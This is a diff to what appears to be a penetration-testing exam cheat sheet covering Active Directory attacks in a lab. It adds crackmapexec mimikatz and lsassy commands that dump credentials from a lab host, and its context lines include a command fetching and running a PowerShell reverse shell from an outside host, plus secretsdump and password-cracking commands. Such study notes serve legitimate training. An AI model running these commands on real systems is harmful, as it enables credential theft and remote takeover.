@@ -1269,6 +1269,17 @@ john hash --wordlist=/usr/share/wordlists/rockyou.txt
 - Transfer to windows: `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'iex(New-Object Net.WebClient).DownloadString("http://192.168.223:8000/Invoke-PowerShellTcpOneLine.ps1")'`
 - Reverse shell script will autorun upcon transfer
 
+## dumping credentials
+### crackmapexec's mimikatz
+- `sudo crackmapexec smb -M mimikatz 192.168.1.54 -u ippsec -Password12345`
+- `sudo crackmapexec smb -M mimikatz 192.168.1.54 -u ippsec -Password12345 --server-port 444`
+- stored in (for sudo): `cat /root/.cme/logs/Mimikatz-192.168.1.54.log`
+- stored in (for non-sudo): `cat ~/cme/logs/Mimikatz-192.168.1.54.log`
+
+### crackmapexec's lsassy
+- `sudo crackmapexec smb -M lsassy 192.168.1.54 -u ippsec -Password12345`
+- `sudo crackmapexec smb -M lsassy 192.168.1.54 -u ippsec -Password12345 --server-port 444`
+- does not store logs locally
 
 ### test for a quick No-Preauth win without supplying a username
 ```
@@ -1352,7 +1363,7 @@ Invoke-Binary /opt/privsc/winPEASx64.exe
 upload /root/notes.txt .
 ```
 
-### Bloodhound
+### Bloodhound (Install before exam, snapshot VM before installing)
 
 - Collection methods - database
 
@@ -1719,6 +1730,7 @@ impacket-secretsdump -just-dc-user *targetuser* corp.com/jeffadmin:"BrouhahaTung
 - decode base64 hashes: `echo "xxxxxxxxxxxxx" | base64 -d`
 - Domain Controller usually has port 88/TCP kerberos-sec
 - For AD enumeration run `nmap -A 192.168.1.50 -Pn`, take note of the common name of the host in AD e.g. `ssl-cert: Subject: commonName=student.pentesting.local`
+- For crackmapexec, if a command failed, try another protocol e.g. smb, winrm, etc
 
 ## MSFVenom
 
